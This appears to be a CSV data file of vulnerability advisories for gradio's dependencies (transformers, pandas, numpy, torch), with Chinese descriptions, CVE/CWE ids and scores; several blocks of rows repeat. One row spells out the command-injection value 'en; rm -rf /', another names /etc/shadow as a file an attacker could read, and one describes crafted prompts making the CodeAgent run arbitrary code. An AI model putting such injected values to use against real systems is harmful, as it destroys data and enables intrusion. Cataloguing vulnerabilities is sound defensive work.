gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
